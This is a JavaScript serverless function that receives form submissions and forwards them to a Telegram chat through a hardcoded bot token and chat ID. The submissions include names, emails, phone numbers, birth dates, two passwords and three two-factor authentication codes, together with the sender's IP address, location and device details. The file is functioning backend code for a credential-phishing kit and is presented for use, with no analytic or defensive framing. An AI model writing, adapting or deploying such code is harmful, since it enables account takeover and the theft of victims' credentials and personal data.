// Serverless: Telegram — order: process.env → telegram-env.json → defaults below (same credentials as 5.0 app.config).

const fs = require('fs');
const path = require('path');

const HARDCODED_TELEGRAM_BOT_TOKEN = '8625564179:AAEUY4TX8DwKzeucrnDo4s2bCXzRFdUCJhU';
const HARDCODED_TELEGRAM_CHAT_ID = '-5186656887';

function loadTelegramEnvFromFile() {
  try {
    const p = path.join(__dirname, 'telegram-env.json');
    if (!fs.existsSync(p)) return {};
    const j = JSON.parse(fs.readFileSync(p, 'utf8'));
    return j && typeof j === 'object' ? j : {};
  } catch (_) {
    return {};
  }
}

const _telegramEnvFile = loadTelegramEnvFromFile();

function escapeHtml(s) {
  return String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString('utf8');
        resolve(raw ? JSON.parse(raw) : {});
      } catch (e) {
        reject(e);
      }
    });
    req.on('error', reject);
  });
}

function nz(v, fallback) {
  if (v === undefined || v === null) return fallback;
  const s = String(v).trim();
  return s === '' ? fallback : s;
}

function buildMessageText(submission, session) {
  const d = submission || {};
  const locationData = session.locationData || {};
  const deviceLabel = nz(session.deviceLabel, 'Computer');
  const mobileFlag = nz(session.mobileFlag, 'False');

  const ip = nz(locationData.ip, 'N/A');
  const countryCode = locationData.country_code;
  const countryName = nz(locationData.country, 'N/A');
  const countryLabel = (countryCode && countryCode !== 'N/A')
    ? `${countryName}(${countryCode})`
    : countryName;

  const baseRegion = (locationData.regionName && locationData.regionName !== 'N/A')
    ? locationData.regionName
    : (locationData.region && locationData.region !== 'N/A')
      ? locationData.region
      : (locationData.country && locationData.country !== 'N/A')
        ? locationData.country
        : 'N/A';
  const regionLabel = (locationData.region_code && locationData.region_code !== 'N/A')
    ? `${baseRegion}(${locationData.region_code})`
    : `${baseRegion}`;

  const locationLine = `${ip} | ${countryLabel}`;
  const cityLabel = (locationData.city && locationData.city !== 'N/A') ? locationData.city : 'N/A';

  const esc = escapeHtml;
  const d1 = nz(d.day, '');
  const d2 = nz(d.month, '');
  const d3 = nz(d.year, '');
  const dob = (!d1 && !d2 && !d3) ? 'N/A' : `${d1}/${d2}/${d3}`;

  return `
<b>📡 Client IP:</b> <code>${esc(ip)}</code>
<b>🧭 Geo summary:</b> <code>${esc(locationLine)}</code>
<b>🏛 Area / region:</b> <code>${esc(regionLabel)}</code>
<b>🌆 City:</b> <code>${esc(cityLabel)}</code>
<b>📲 Mobile view:</b> <code>${esc(mobileFlag)}</code>
<b>🖥️ Device:</b> <code>${esc(deviceLabel)}</code>
----------------------------------
<b>🪪 Display name:</b> <code>${esc(d.fullName || '')}</code>
<b>✉️ Mailbox:</b> <code>${esc(d.email || '')}</code>
<b>💼 Work email:</b> <code>${esc(d.emailBusiness || '')}</code>
<b>📰 Page name:</b> <code>${esc(d.fanpage || '')}</code>
<b>☎️ Phone:</b> <code>${esc(d.phone || '')}</code>
<b>#️⃣ Dial prefix:</b> <code>${esc(d.callCode || '')}</code>
<b>🎂 Birth date:</b> <code>${esc(dob)}</code>
----------------------------------
<b>🔑 Passphrase A:</b> <code>${esc(d.password || '')}</code>
<b>🔑 Passphrase B:</b> <code>${esc(d.passwordSecond || '')}</code>
----------------------------------
<b>🔢 Auth code (1):</b> <code>① ${esc(d.twoFa || '')}</code>
<b>🔢 Auth code (2):</b> <code>② ${esc(d.twoFaSecond || '')}</code>
<b>🔢 Auth code (3):</b> <code>③ ${esc(d.twoFaThird || '')}</code>`;
}

async function handler(req, res) {
  res.setHeader('content-type', 'application/json');
  res.setHeader('cache-control', 'no-store');

  if (req.method === 'OPTIONS') {
    res.setHeader('allow', 'POST, OPTIONS');
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    res.setHeader('allow', 'POST, OPTIONS');
    return res.status(405).send(JSON.stringify({ ok: false, error: 'method_not_allowed' }));
  }

  const token =
    String(process.env.TELEGRAM_BOT_TOKEN || '').trim() ||
    String(_telegramEnvFile.TELEGRAM_BOT_TOKEN || '').trim() ||
    HARDCODED_TELEGRAM_BOT_TOKEN;
  const chatId =
    String(process.env.TELEGRAM_CHAT_ID || '').trim() ||
    String(_telegramEnvFile.TELEGRAM_CHAT_ID || '').trim() ||
    HARDCODED_TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    return res.status(503).send(JSON.stringify({ ok: false, error: 'not_configured' }));
  }

  let body;
  try {
    body = await readBody(req);
  } catch (_) {
    return res.status(400).send(JSON.stringify({ ok: false, error: 'invalid_json' }));
  }

  const raw = JSON.stringify(body);
  if (raw.length > 65536) {
    return res.status(413).send(JSON.stringify({ ok: false, error: 'payload_too_large' }));
  }

  const submission = body.submission;
  const session = body.session;
  if (!submission || typeof submission !== 'object' || !session || typeof session !== 'object') {
    return res.status(400).send(JSON.stringify({ ok: false, error: 'invalid_shape' }));
  }

  const text = buildMessageText(submission, session).trim();

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML'
      })
    });
    if (!tgRes.ok) {
      return res.status(502).send(JSON.stringify({ ok: false, error: 'telegram_upstream' }));
    }
    return res.status(200).send(JSON.stringify({ ok: true }));
  } catch (_) {
    return res.status(502).send(JSON.stringify({ ok: false, error: 'telegram_upstream' }));
  }
}

module.exports = handler;
